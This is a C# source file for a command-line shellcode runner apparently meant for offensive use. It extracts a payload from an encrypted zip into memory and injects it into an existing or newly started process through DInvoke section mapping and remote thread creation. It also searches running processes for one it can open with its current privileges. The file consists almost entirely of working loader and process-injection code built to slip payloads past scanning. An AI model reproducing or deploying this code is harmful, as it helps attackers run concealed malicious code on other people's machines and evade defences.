using System;
using System.IO;
using System.Linq;
using Ionic.Zip;
using System.Diagnostics;
using System.Collections.Generic;
using NDesk.Options;

namespace SharpZipSCRunner
{
    class Program
    {

        public static void PrintBanner()
        {
            Console.WriteLine(@" ___  _                   ____ _       ___                          ");
            Console.WriteLine(@"/ __>| |_  ___  _ _  ___ |_  /<_> ___ | . \ _ _ ._ _ ._ _  ___  _ _ ");
            Console.WriteLine(@"\__ \| . |<_> || '_>| . \ / / | || . \|   /| | || ' || ' |/ ._>| '_>");
            Console.WriteLine(@"<___/|_|_|<___||_|  |  _//___||_||  _/|_\_\`___||_|_||_|_|\___.|_|  ");
            Console.WriteLine(@"                    |_|          |_|                                ");
            Console.WriteLine("\n\nAn Encrypted zip on your computer? what could possibly go wrong?\n");


        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine(" Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        //walking process list of all processess with name [arg] until we find a process we can get a handle on.
        public static Process CandidateSelector(String process)
        {
            Process candidate = new Process();
            Process[] processList = Process.GetProcessesByName(process);
            IntPtr procHandle = IntPtr.Zero;
            if (processList.Length == 0)
            {
                throw new ArgumentException("There doesn't seem to be any processess running with the name {0}:", process);
            }

            foreach (Process p in processList)
            {
                try
                {
                    procHandle = p.Handle;
                    if (procHandle != IntPtr.Zero)
                    {
                        candidate = p;
                        break;
                    }

                }
                catch
                {
                    continue;
                }
            }
            if (procHandle == IntPtr.Zero)
            {
                throw new ArgumentException("No process of {0}  could be accessed from current privillege context. Try using another process instead, or create one yourself.", process);
            }
            return candidate;
        }

        //get bytearray in mem from encryptedzip, this method assumes only one zipentry is present in the zip.
        public static byte[] Zip2Mem(String zipPath, String password)
        {
            if (!ZipFile.IsZipFile(zipPath))
            {
                throw new ArgumentException("You did not provide a path to a valid zipfile, check if zip is valid or if the zip argument is missing.", zipPath);
            }
            byte[] code;
            MemoryStream memStream = new MemoryStream();
            using (ZipFile zip = ZipFile.Read(zipPath))
            {
                ZipEntry entry = zip.Entries.ToArray()[0];
                entry.ExtractWithPassword(memStream, password);
            }
            code = memStream.ToArray();
            return code;
        }

        //overload of Zip2mem in case of multiple items in a zip, extracts specified zipentry (specified by name)
        public static byte[] Zip2Mem(String zipPath, String zipEntry, String password)
        {
            if (!ZipFile.IsZipFile(zipPath))
            {
                throw new ArgumentException("You did not provide a path to a valid zipfile, check if zip is valid or if the zip argument is missing.", zipPath);
            }
            byte[] code;
            MemoryStream memStream = new MemoryStream();
            using (ZipFile zip = ZipFile.Read(zipPath))
            {
                var zipEntries = zip.Entries;
                ZipEntry entry = zip[zipEntry];
                if (!zipEntries.Contains(entry))
                {
                    throw new ArgumentException("zipentry is not present in zipfile");
                }
                entry.ExtractWithPassword(memStream, password);
            }
            code = memStream.ToArray();
            return code;
        }

        //inject in arbitrary process if provided (takes care of process selection based on current privilleges), can also spawn a new arbitrary process if desired. Else inject in itself (not recommended). - can cause stack overflow if you inject in self...
        public static void Inject(byte[] code, String processName = "", bool newProcess = false)
        {
            Process process = new Process();
            DInvoke.Injection.AllocationTechnique technique = new DInvoke.Injection.SectionMapAlloc();
            DInvoke.Injection.ExecutionTechnique execute = new DInvoke.Injection.RemoteThreadCreate();
            DInvoke.Injection.PICPayload payload = new DInvoke.Injection.PICPayload(code);
            try
            {
                if (!String.IsNullOrEmpty(processName))
                {
                    if (!newProcess)
                    {
                        process = CandidateSelector(processName);
                    }
                    else
                    {
                        process = Process.Start(processName);
                        Console.WriteLine("new process started, PID:{0} \n", process.Id);
                    }
                    DInvoke.Injection.Injector.Inject(payload, technique, execute, process);
                }
                else
                {
                    Console.WriteLine("Attention: Injecting into self is unstable. it is therefore NOT recommended.");
                    DInvoke.Injection.Injector.Inject(payload, technique, execute);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        static void Main(string[] args)
        {

            PrintBanner();
            String zipPath = "";
            String password = "";
            String process = "";
            String zipEntry = "";
            bool newProcess = false;
            bool showHelp = false;
            byte[] code = null;

            var options = new OptionSet()
            {
                {"z|zip-file=","The path on disk to the encrypted zip\n", o => zipPath = o },
                {"e|entry=","The specific zip entry to put in mem (optional), if not provided assumes only one zip entry is present\n",o=> zipEntry = o },
                {"p|password=","The password of the encrypted zip \n", o => password = o },
                {"i|process=","The process to inject into (if not used will inject into self (not recommended)\n", o => process = o },
                {"c|create","Create a new process, and injects into that process (requires the process argument)\n", o => newProcess = true },
                {"h|help", "shows this menu\n",o=>showHelp = true }
            };
            try
            {
                options.Parse(args);
                if (showHelp)
                {
                    ShowHelp(options);
                    return;
                }

                if (String.IsNullOrEmpty(zipEntry))
                {
                    code = Zip2Mem(zipPath, password);
                }
                else
                {
                    code = Zip2Mem(zipPath, zipEntry, password);
                }



                if (String.IsNullOrEmpty(process))
                {
                    Inject(code);
                }
                else if (!String.IsNullOrEmpty(process))
                {
                    Inject(code, process, newProcess);
                }



            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                ShowHelp(options);
            }

        }

    }
}
